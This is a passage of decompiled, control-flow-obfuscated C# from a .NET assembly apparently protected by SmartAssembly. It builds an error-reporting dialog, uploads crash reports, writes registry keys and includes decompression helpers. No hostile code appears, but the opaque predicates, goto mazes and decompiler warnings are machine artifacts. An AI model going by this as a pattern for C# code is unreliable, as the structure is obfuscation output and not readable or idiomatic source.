		//IL_14e9: Expected O, but got Unknown
		//IL_14ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_14f4: Expected O, but got Unknown
		//IL_14f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ff: Expected O, but got Unknown
		//IL_1500: Unknown result type (might be due to invalid IL or missing references)
		//IL_150a: Expected O, but got Unknown
		//IL_150d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1517: Expected O, but got Unknown
		while (true)
		{
			form0_0.panel_0 = new Panel();
			while (true)
			{
				form0_0.button_5 = new Button();
				form0_0.checkBox_0 = new CheckBox();
				form0_0.label_0 = new Label();
				form0_0.button_0 = new Button();
				while (true)
				{
					form0_0.button_1 = new Button();
					while (true)
					{
						form0_0.label_1 = new Label();
						form0_0.control1_0 = new Control1();
						form0_0.class47_0 = new Class47();
						form0_0.button_7 = new Button();
						while (true)
						{
							form0_0.panel_1 = new Panel();
							int num = 35;
							if (!oLMEnfKBTsIqRDPCqp())
							{
							}
							while (true)
							{
								switch (num)
								{
								case 69:
									((Control)form0_0.control0_0).set_Size(new Size(368, 16));
									goto case 28;
								case 28:
									((Control)form0_0.control0_0).set_TabIndex(18);
									((Control)form0_0.control0_0).set_TabStop(false);
									((Control)form0_0.control0_0).set_Text("Preparing the error report.");
									goto case 58;
								case 58:
									((Control)form0_0.control0_1).set_Location(new Point(24, 96));
									goto case 8;
								case 8:
									((Control)form0_0.control0_1).set_Name("connectingFeedback");
									((Control)form0_0.control0_1).set_Size(new Size(368, 16));
									goto case 4;
								case 4:
									((Control)form0_0.control0_1).set_TabIndex(19);
									((Control)form0_0.control0_1).set_TabStop(false);
									goto case 57;
								case 57:
									((Control)form0_0.control0_1).set_Text("Connecting to server.");
									((Control)form0_0.control0_2).set_Location(new Point(24, 120));
									((Control)form0_0.control0_2).set_Name("transferingFeedback");
									goto case 24;
								case 24:
									((Control)form0_0.control0_2).set_Size(new Size(368, 16));
									((Control)form0_0.control0_2).set_TabIndex(20);
									((Control)form0_0.control0_2).set_TabStop(false);
									((Control)form0_0.control0_2).set_Text("Transferring report.");
									((Control)form0_0.control0_3).set_Location(new Point(24, 144));
									((Control)form0_0.control0_3).set_Name("completedFeedback");
									((Control)form0_0.control0_3).set_Size(new Size(368, 16));
									((Control)form0_0.control0_3).set_TabIndex(21);
									num = 2;
									if (oLMEnfKBTsIqRDPCqp())
									{
									}
									continue;
								case 68:
									((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
									goto case 55;
								case 55:
									((Control)form0_0.button_5).set_Location(new Point(66, 205));
									num = 14;
									if (!oLMEnfKBTsIqRDPCqp())
									{
										continue;
									}
									goto end_IL_1483;
								case 66:
									((Control)form0_0.control3_0).set_Size(new Size(250, 42));
									((Control)form0_0.control3_0).set_TabIndex(11);
									goto case 47;
								case 47:
									((Control)form0_0.control3_0).set_TabStop(false);
									((Control)form0_0.control3_0).set_Visible(false);
									((Control)form0_0.control1_1).set_BackColor(Color.FromArgb(36, 96, 179));
									((Control)form0_0.control1_1).set_Dock((DockStyle)1);
									goto case 15;
								case 15:
									((Control)form0_0.control1_1).set_ForeColor(Color.White);
									Class17.smethod_85(form0_0.control1_1, Enum2.const_1);
									goto case 53;
								case 53:
									Class17.smethod_22(form0_0.control1_1, (Image)null);
									((Control)form0_0.control1_1).set_Location(new Point(0, 0));
									((Control)form0_0.control1_1).set_Name("headerControl2");
									((Control)form0_0.control1_1).set_Size(new Size(413, 58));
									((Control)form0_0.control1_1).set_TabIndex(24);
									((Control)form0_0.control1_1).set_TabStop(false);
									((Control)form0_0.control1_1).set_Text("Please wait while %AppName% is sending the report to %CompanyName% through the Internet.");
									((Control)form0_0.control0_0).set_Location(new Point(24, 72));
									num = 16;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 59;
								case 59:
									((Control)form0_0.class47_0).set_Anchor((AnchorStyles)13);
									((Label)form0_0.class47_0).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.class47_0).set_Location(new Point(20, 69));
									((Control)form0_0.class47_0).set_Name("errorMessage");
									((Control)form0_0.class47_0).set_Size(new Size(381, 13));
									((Control)form0_0.class47_0).set_TabIndex(10);
									((Control)form0_0.class47_0).set_Text("errorMessage");
									((Label)form0_0.class47_0).set_UseMnemonic(false);
									((Control)form0_0.button_7).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_7).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_7).set_Location(new Point(136, 205));
									((Control)form0_0.button_7).set_Name("saveAsFile");
									num = 13;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 42;
								case 42:
									((Control)form0_0.panel_2).set_Name("panelEmail");
									((Control)form0_0.panel_2).set_Size(new Size(413, 232));
									goto case 60;
								case 60:
									((Control)form0_0.panel_2).set_TabIndex(4);
									((Control)form0_0.panel_2).set_Visible(false);
									form0_0.label_3.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_3).set_Location(new Point(20, 131));
									((Control)form0_0.label_3).set_Name("labelEmail");
									((Control)form0_0.label_3).set_Size(new Size(100, 16));
									((Control)form0_0.label_3).set_TabIndex(9);
									((Control)form0_0.label_3).set_Text("&Email address:");
									goto case 19;
								case 19:
									((ButtonBase)form0_0.checkBox_1).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.checkBox_1).set_Location(new Point(120, 160));
									((Control)form0_0.checkBox_1).set_Name("sendAnonymously");
									((Control)form0_0.checkBox_1).set_Size(new Size(232, 16));
									goto case 25;
								case 25:
									((Control)form0_0.checkBox_1).set_TabIndex(11);
									num = 46;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 32;
								case 32:
									((Form)form0_0).set_TopMost(true);
									((Control)form0_0.panel_0).ResumeLayout(false);
									((Control)form0_0.panel_1).ResumeLayout(false);
									((Control)form0_0.panel_2).ResumeLayout(false);
									((Control)form0_0.panel_2).PerformLayout();
									((Control)form0_0).ResumeLayout(false);
									num = 70;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 6;
								case 6:
									((Control)form0_0.label_1).set_Text("To help improve the software you use, %CompanyName% is interested in learning more about this error. We have created a report about the error for you to send to us.");
									((Control)form0_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
									((Control)form0_0.control1_0).set_Dock((DockStyle)1);
									((Control)form0_0.control1_0).set_ForeColor(Color.White);
									Class17.smethod_85(form0_0.control1_0, Enum2.const_1);
									Class17.smethod_22(form0_0.control1_0, (Image)null);
									((Control)form0_0.control1_0).set_Location(new Point(0, 0));
									goto case 31;
								case 31:
									((Control)form0_0.control1_0).set_Name("headerControl1");
									goto case 64;
								case 64:
									((Control)form0_0.control1_0).set_Size(new Size(413, 58));
									((Control)form0_0.control1_0).set_TabIndex(3);
									((Control)form0_0.control1_0).set_TabStop(false);
									goto case 41;
								case 41:
									((Control)form0_0.control1_0).set_Text("%AppName% has encountered a problem.\nWe are sorry for the inconvenience.");
									goto case 59;
								case 63:
									((Control)form0_0.label_0).set_Size(new Size(381, 16));
									goto case 17;
								case 17:
									((Control)form0_0.label_0).set_TabIndex(11);
									((Control)form0_0.label_0).set_Text("Please tell %CompanyName% about this problem.");
									((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_0).set_Location(new Point(325, 205));
									((Control)form0_0.button_0).set_Name("dontSendReport");
									((Control)form0_0.button_0).set_Size(new Size(75, 24));
									((Control)form0_0.button_0).set_TabIndex(6);
									((Control)form0_0.button_0).set_Text("&Don't Send");
									((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_1);
									((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
									goto case 38;
								case 38:
									((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_1).set_Location(new Point(214, 205));
									((Control)form0_0.button_1).set_Name("sendReport");
									((Control)form0_0.button_1).set_Size(new Size(105, 24));
									goto case 23;
								case 23:
									((Control)form0_0.button_1).set_TabIndex(9);
									((Control)form0_0.button_1).set_Text("&Send Error Report");
									((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_0);
									((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
									form0_0.label_1.set_FlatStyle((FlatStyle)3);
									goto case 61;
								case 61:
									((Control)form0_0.label_1).set_Location(new Point(20, 140));
									((Control)form0_0.label_1).set_Name("pleaseTellMessage");
									goto case 9;
								case 9:
									((Control)form0_0.label_1).set_Size(new Size(381, 55));
									((Control)form0_0.label_1).set_TabIndex(12);
									goto case 6;
								case 62:
									((Control)form0_0).set_BackColor(SystemColors.Window);
									((Form)form0_0).set_ClientSize(new Size(434, 768));
									((Form)form0_0).set_ControlBox(false);
									((Control)form0_0).get_Controls().Add((Control)(object)form0_0.control2_0);
									((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_2);
									((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_0);
									((Control)form0_0).get_Controls().Add((Control)(object)form0_0.panel_1);
									goto case 44;
								case 44:
									((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
									((Control)form0_0).set_Name("ExceptionReportingForm");
									((Form)form0_0).set_ShowInTaskbar(false);
									((Form)form0_0).set_StartPosition((FormStartPosition)1);
									goto case 30;
								case 30:
									((Control)form0_0).set_Text("%AppName%");
									goto case 32;
								case 56:
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.checkBox_1);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.textBox_0);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.control1_2);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_2);
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.button_6);
									((Control)form0_0.panel_2).set_Location(new Point(11, 512));
									goto case 42;
								case 54:
									((Control)form0_0.button_5).set_TabIndex(13);
									((Control)form0_0.button_5).set_Text("Debug");
									((Control)form0_0.button_5).set_Visible(false);
									((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_11);
									((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
									goto case 51;
								case 51:
									((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.checkBox_0).set_Location(new Point(22, 99));
									((Control)form0_0.checkBox_0).set_Name("continueCheckBox");
									((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
									((Control)form0_0.checkBox_0).set_TabIndex(14);
									((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
									form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_4);
									((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
									form0_0.label_0.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
									((Control)form0_0.label_0).set_Location(new Point(20, 124));
									((Control)form0_0.label_0).set_Name("pleaseTellTitle");
									goto case 63;
								case 52:
									((Control)form0_0.control1_2).set_BackColor(Color.FromArgb(36, 96, 179));
									((Control)form0_0.control1_2).set_Dock((DockStyle)1);
									((Control)form0_0.control1_2).set_ForeColor(Color.White);
									goto case 33;
								case 33:
									Class17.smethod_85(form0_0.control1_2, Enum2.const_1);
									Class17.smethod_22(form0_0.control1_2, (Image)null);
									((Control)form0_0.control1_2).set_Location(new Point(0, 0));
									((Control)form0_0.control1_2).set_Name("headerControl3");
									goto case 18;
								case 18:
									((Control)form0_0.control1_2).set_Size(new Size(413, 58));
									((Control)form0_0.control1_2).set_TabIndex(3);
									((Control)form0_0.control1_2).set_TabStop(false);
									((Control)form0_0.control1_2).set_Text("Do you want to be contacted by %CompanyName% regarding this problem?");
									((Control)form0_0.label_2).set_Anchor((AnchorStyles)13);
									form0_0.label_2.set_FlatStyle((FlatStyle)3);
									((Control)form0_0.label_2).set_Location(new Point(20, 69));
									goto case 37;
								case 37:
									((Control)form0_0.label_2).set_Name("label3");
									goto case 34;
								case 34:
									((Control)form0_0.label_2).set_Size(new Size(381, 43));
									((Control)form0_0.label_2).set_TabIndex(10);
									((Control)form0_0.label_2).set_Text("If you want to be contacted by %CompanyName% regarding this error, please provide your e-mail address. This information will not be used for any other purpose.");
									((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
									((Control)form0_0.button_6).set_Enabled(false);
									((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_6).set_Location(new Point(295, 197));
									((Control)form0_0.button_6).set_Name("continueSendReport");
									((Control)form0_0.button_6).set_Size(new Size(105, 24));
									((Control)form0_0.button_6).set_TabIndex(12);
									((Control)form0_0.button_6).set_Text("&Send Error Report");
									((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
									((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
									((Control)form0_0.control2_0).set_Cursor(Cursors.get_Hand());
									((Control)form0_0.control2_0).set_Location(new Point(6, 730));
									((Control)form0_0.control2_0).set_Name("poweredBy");
									((Control)form0_0.control2_0).set_Size(new Size(112, 32));
									((Control)form0_0.control2_0).set_TabIndex(5);
									((Control)form0_0.control2_0).set_TabStop(false);
									((Control)form0_0.control2_0).set_Text("poweredBy1");
									((Control)form0_0.button_8).set_Anchor((AnchorStyles)10);
									goto case 7;
								case 7:
									((ButtonBase)form0_0.button_8).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_8).set_Location(new Point(146, 197));
									((Control)form0_0.button_8).set_Name("saveReport");
									((Control)form0_0.button_8).set_Size(new Size(80, 24));
									goto case 5;
								case 5:
									((Control)form0_0.button_8).set_TabIndex(25);
									((Control)form0_0.button_8).set_Text("&Save Report");
									((Control)form0_0.button_8).set_Visible(false);
									((Control)form0_0.button_8).add_Click((EventHandler)form0_0.method_16);
									((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
									num = 62;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 64;
								default:
									((Control)form0_0.button_4).set_Name("retrySending");
									((Control)form0_0.button_4).set_Size(new Size(80, 24));
									((Control)form0_0.button_4).set_TabIndex(23);
									((Control)form0_0.button_4).set_Text("&Retry");
									((Control)form0_0.button_4).set_Visible(false);
									((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_9);
									((Control)form0_0.control3_0).set_Location(new Point(87, 145));
									goto case 48;
								case 48:
									((Control)form0_0.control3_0).set_Name("waitSendingReport");
									goto case 66;
								case 46:
									((Control)form0_0.checkBox_1).set_Text("I prefer to send this report &anonymously.");
									form0_0.checkBox_1.add_CheckedChanged((EventHandler)form0_0.method_14);
									goto case 29;
								case 29:
									((Control)form0_0.textBox_0).set_Location(new Point(120, 128));
									((Control)form0_0.textBox_0).set_Name("email");
									((Control)form0_0.textBox_0).set_Size(new Size(256, 20));
									((Control)form0_0.textBox_0).set_TabIndex(10);
									((Control)form0_0.textBox_0).add_TextChanged((EventHandler)form0_0.method_13);
									goto case 52;
								case 45:
									form0_0.button_6 = new Button();
									form0_0.control2_0 = new Control2();
									form0_0.button_8 = new Button();
									((Control)form0_0.panel_0).SuspendLayout();
									((Control)form0_0.panel_1).SuspendLayout();
									((Control)form0_0.panel_2).SuspendLayout();
									((Control)form0_0).SuspendLayout();
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_5);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.checkBox_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_1);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.label_1);
									goto case 22;
								case 22:
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.control1_0);
									num = 0;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto default;
								case 43:
									((Control)form0_0.button_7).set_TabIndex(11);
									num = 26;
									if (LDM65EyL5AHhD5120V())
									{
										continue;
									}
									goto case 69;
								case 40:
									((Control)form0_0.button_3).set_Enabled(false);
									((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
									goto case 20;
								case 20:
									((Control)form0_0.button_3).set_Location(new Point(232, 197));
									((Control)form0_0.button_3).set_Name("ok");
									((Control)form0_0.button_3).set_Size(new Size(80, 24));
									((Control)form0_0.button_3).set_TabIndex(22);
									((Control)form0_0.button_3).set_Text("&OK");
									((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_3);
									((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_4).set_Location(new Point(144, 197));
									goto default;
								case 39:
									((Control)form0_0.panel_1).set_Size(new Size(413, 232));
									((Control)form0_0.panel_1).set_TabIndex(2);
									((Control)form0_0.panel_1).set_Visible(false);
									((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
									((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
									((Control)form0_0.button_2).set_Location(new Point(320, 197));
									goto case 36;
								case 36:
									((Control)form0_0.button_2).set_Name("cancelSending");
									((Control)form0_0.button_2).set_Size(new Size(80, 24));
									((Control)form0_0.button_2).set_TabIndex(10);
									((Control)form0_0.button_2).set_Text("&Cancel");
									((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_2);
									((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
									goto case 40;
								case 35:
									form0_0.button_2 = new Button();
									form0_0.button_3 = new Button();
									form0_0.button_4 = new Button();
									form0_0.control3_0 = new Control3();
									form0_0.control1_1 = new Control1();
									form0_0.control0_0 = new Control0();
									goto case 3;
								case 3:
									form0_0.control0_1 = new Control0();
									form0_0.control0_2 = new Control0();
									form0_0.control0_3 = new Control0();
									form0_0.panel_2 = new Panel();
									form0_0.label_3 = new Label();
									form0_0.checkBox_1 = new CheckBox();
									form0_0.textBox_0 = new TextBox();
									form0_0.control1_2 = new Control1();
									goto case 11;
								case 11:
									form0_0.label_2 = new Label();
									num = 45;
									if (oLMEnfKBTsIqRDPCqp())
									{
									}
									continue;
								case 26:
									((Control)form0_0.button_7).set_Text("Save as &File");
									((Control)form0_0.button_7).add_Click((EventHandler)form0_0.method_15);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_8);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_2);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_3);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.button_4);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control3_0);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control1_1);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_0);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_1);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_2);
									((Control)form0_0.panel_1).get_Controls().Add((Control)(object)form0_0.control0_3);
									((Control)form0_0.panel_1).set_Location(new Point(8, 264));
									((Control)form0_0.panel_1).set_Name("panelSending");
									goto case 39;
								case 16:
									((Control)form0_0.control0_0).set_Name("preparingFeedback");
									goto case 69;
								case 14:
									((Control)form0_0.button_5).set_Name("debug");
									goto case 12;
								case 12:
									((Control)form0_0.button_5).set_Size(new Size(64, 24));
									num = 54;
									if (oLMEnfKBTsIqRDPCqp())
									{
									}
									continue;
								case 13:
									((Control)form0_0.button_7).set_Size(new Size(72, 24));
									goto case 43;
								case 0:
								case 10:
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.class47_0);
									((Control)form0_0.panel_0).get_Controls().Add((Control)(object)form0_0.button_7);
									((Control)form0_0.panel_0).set_Location(new Point(8, 8));
									((Control)form0_0.panel_0).set_Name("panelInformation");
									((Control)form0_0.panel_0).set_Size(new Size(413, 240));
									((Control)form0_0.panel_0).set_TabIndex(0);
									goto case 68;
								case 2:
									((Control)form0_0.control0_3).set_TabStop(false);
									((Control)form0_0.control0_3).set_Text("Error reporting completed. Thank you.");
									((Control)form0_0.panel_2).get_Controls().Add((Control)(object)form0_0.label_3);
									goto case 56;
								case 67:
									break;
								case 21:
									goto end_IL_1483;
								case 27:
									goto end_IL_14a3;
								case 1:
								case 49:
									goto end_IL_14d1;
								case 65:
									goto end_IL_14de;
								case 70:
									return;
								}
								break;
							}
							continue;
							end_IL_1483:
							break;
						}
						continue;
						end_IL_14a3:
						break;
					}
					continue;
					end_IL_14d1:
					break;
				}
				continue;
				end_IL_14de:
				break;
			}
		}
	}

	static bool smethod_45(Class26.Class27 class27_0)
	{
		int int_ = class27_0.int_4;
		bool result = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num2;
			switch (int_)
			{
			case 4:
				num2 = Class17.smethod_63(class27_0.class28_0, 16);
				if (!oLMEnfKBTsIqRDPCqp())
				{
					switch (4)
					{
					case 0:
					case 12:
						break;
					case 2:
						goto IL_016a;
					case 1:
						goto IL_0172;
					case 4:
						goto IL_0179;
					default:
						goto IL_019b;
					case 8:
						goto IL_01a2;
					case 3:
					case 5:
						goto IL_01b4;
					case 11:
						goto IL_01d4;
					case 9:
						goto IL_021a;
					case 7:
						goto IL_022f;
					case 10:
						goto IL_0250;
					case 13:
						return result;
					}
					break;
				}
				goto IL_01a2;
			case 3:
				if ((class27_0.int_8 = Class17.smethod_63(class27_0.class28_0, 16)) >= 0)
				{
					Class17.smethod_167(class27_0.class28_0, 16);
					class27_0.int_4 = 4;
					goto case 4;
				}
				goto IL_019b;
			case 2:
			{
				if (class27_0.bool_0)
				{
					goto IL_016a;
				}
				int num = Class17.smethod_63(class27_0.class28_0, 3);
				if (num < 0)
				{
					return false;
				}
				Class17.smethod_167(class27_0.class28_0, 3);
				if (((uint)num & (true ? 1u : 0u)) != 0)
				{
					class27_0.bool_0 = true;
				}
				switch (num >> 1)
				{
				case 0:
					Class17.smethod_153(class27_0.class28_0);
					class27_0.int_4 = 3;
					goto IL_01b4;
				case 1:
					break;
				case 2:
					class27_0.class31_0 = new Class26.Class31();
					class27_0.int_4 = 6;
					goto IL_01b4;
				default:
					goto IL_01b4;
				}
				class27_0.class30_0 = Class26.Class30.class30_0;
				goto IL_01a2;
			}
			case 5:
				num3 = Class17.smethod_151(class27_0.class29_0, class27_0.class28_0, class27_0.int_8);
				goto IL_01d4;
			case 6:
				if (!Class17.smethod_184(class27_0.class31_0, class27_0.class28_0))
				{
					goto IL_021a;
				}
				class27_0.class30_0 = Class17.smethod_77(class27_0.class31_0);
				goto IL_022f;
			case 7:
			case 8:
			case 9:
			case 10:
				return Class17.smethod_122(class27_0);
			default:
				goto IL_0250;
			case 12:
				{
					return false;
				}
				IL_021a:
				return false;
				IL_019b:
				return false;
				IL_0179:
				if (num2 < 0)
				{
					return false;
				}
				Class17.smethod_167(class27_0.class28_0, 16);
				class27_0.int_4 = 5;
				goto case 5;
				IL_016a:
				class27_0.int_4 = 12;
				goto IL_0172;
				IL_0172:
				return false;
				IL_01d4:
				class27_0.int_8 -= num3;
				if (class27_0.int_8 == 0)
				{
					class27_0.int_4 = 2;
					return true;
				}
				return !Class17.smethod_31(class27_0.class28_0);
				IL_01a2:
				class27_0.class30_1 = Class26.Class30.class30_1;
				class27_0.int_4 = 7;
				goto IL_01b4;
				IL_01b4:
				return true;
				IL_0250:
				return false;
				IL_022f:
				class27_0.class30_1 = Class17.smethod_87(class27_0.class31_0);
				class27_0.int_4 = 7;
				goto case 7;
			}
		}
	}

	static string smethod_46(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.string_0;
	}

	static string smethod_47(Form1 form1_0, string string_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static void smethod_48(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class17.smethod_128(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static void smethod_49(int int_0, Class26.Class28 class28_0, int int_1, byte[] byte_0)
	{
		if (class28_0.int_0 >= class28_0.int_1)
		{
			int num = int_0 + int_1;
			while (true)
			{
				IL_00af:
				if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
				{
					if (((uint)int_1 & (true ? 1u : 0u)) != 0)
					{
						goto IL_0060;
					}
					goto IL_0093;
				}
				goto IL_00ca;
				IL_0093:
				class28_0.byte_0 = byte_0;
				class28_0.int_0 = int_0;
				int num2 = 6;
				if (!oLMEnfKBTsIqRDPCqp())
				{
					while (true)
					{
						switch (num2)
						{
						default:
							num2 = 4;
							if (!oLMEnfKBTsIqRDPCqp())
							{
							}
							continue;
						case 1:
							break;
						case 5:
							goto IL_00af;
						case 0:
						case 3:
							goto end_IL_00af;
						case 6:
							class28_0.int_1 = num;
							return;
						case 2:
						case 4:
							goto IL_00ca;
						}
						break;
					}
					goto IL_0060;
				}
				goto IL_00ca;
				IL_00ca:
				throw new ArgumentOutOfRangeException();
				IL_0060:
				class28_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class28_0.int_2);
				class28_0.int_2 += 8;
				goto IL_0093;
				continue;
				end_IL_00af:
				break;
			}
		}
		throw new InvalidOperationException();
	}

	static bool smethod_50()
	{
		try
		{
			Class51.Struct17 struct17_ = default(Class51.Struct17);
			GetSystemInfo(ref struct17_);
			return struct17_.ushort_0 == 9;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_51(string string_0, Class50 class50_0, byte[] byte_0, Delegate15 delegate15_0, string string_1, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class50_0.string_2);
			if (LDM65EyL5AHhD5120V())
			{
				switch (2)
				{
				case 0:
				case 2:
					break;
				default:
					goto IL_003e;
				case 4:
					goto IL_004a;
				}
			}
			if (class50_0.iwebProxy_0 != null)
			{
				goto IL_003e;
			}
			goto IL_004a;
			IL_004a:
			delegate15_0(reportingService.UploadReport2(class50_0.string_1, byte_0, string_0, string_1, string_2));
			return;
			IL_003e:
			((HttpWebClientProtocol)reportingService).set_Proxy(class50_0.iwebProxy_0);
			goto IL_004a;
		}
		catch (Exception ex)
		{
			delegate15_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_52(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_1;
	}

	static string smethod_53(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.string_0;
	}

	static void smethod_54(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			}
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch
		{
		}
	}

	static int smethod_55(Class26.Class33 class33_0, int int_0)
	{
		if (int_0 != 255)
		{
			int num = 257;
			while (true)
			{
				IL_0056:
				if (int_0 >= 8)
				{
					num += 4;
				}
				else
				{
					int num2 = 5;
					if (!LDM65EyL5AHhD5120V())
					{
						break;
					}
					while (true)
					{
						switch (num2)
						{
						case 3:
							break;
						default:
							num2 = 3;
							if (!oLMEnfKBTsIqRDPCqp())
							{
								continue;
							}
							goto case 5;
						case 1:
						case 2:
							goto IL_0056;
						case 0:
						case 4:
							goto end_IL_0056;
						case 5:
							return num + int_0;
						}
						break;
					}
				}
				int_0 >>= 1;
				continue;
				end_IL_0056:
				break;
			}
		}
		return 285;
	}

	static void smethod_56(Class26.Class33.Class34 class34_0)
	{
		int[] array = new int[class34_0.int_3];
		while (true)
		{
			int num = 0;
			while (true)
			{
				class34_0.short_1 = new short[class34_0.short_0.Length];
				while (true)
				{
					int num2 = 0;
					while (true)
					{
						if (num2 < class34_0.int_3)
						{
							array[num2] = num;
							goto IL_0016;
						}
						int num3 = 0;
						while (true)
						{
							if (num3 >= class34_0.int_1)
							{
								return;
							}
							int num4 = class34_0.byte_0[num3];
							if (oLMEnfKBTsIqRDPCqp())
							{
								break;
							}
							switch (2)
							{
							case 2:
								if (num4 > 0)
								{
									class34_0.short_1[num3] = Class17.smethod_120(array[num4 - 1]);
									array[num4 - 1] += 1 << 16 - num4;
								}
								num3++;
								continue;
							case 7:
								continue;
							case 5:
								goto end_IL_00ae;
							case 1:
							case 4:
								goto end_IL_00cc;
							case 0:
							case 3:
								goto end_IL_00d1;
							}
							goto IL_0016;
							continue;
							end_IL_00ae:
							break;
						}
						break;
						IL_0016:
						num += class34_0.int_2[num2] << 15 - num2;
						num2++;
					}
					continue;
					end_IL_00cc:
					break;
				}
				continue;
				end_IL_00d1:
				break;
			}
		}
	}

	static bool smethod_57(Class26.Class32 class32_0)
	{
		if (class32_0.int_0 == 30)
		{
			return Class17.smethod_116(class32_0.class36_0);
		}
		return false;
	}

	static void smethod_58(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class17.smethod_128(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static string smethod_59()
	{
		return "Software\\Red Gate\\" + Class17.smethod_79();
	}

	static void smethod_60(Form0 form0_0, ThreadStart threadStart_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_61(Class26.Class29 class29_0, int int_0)
	{
		if (class29_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
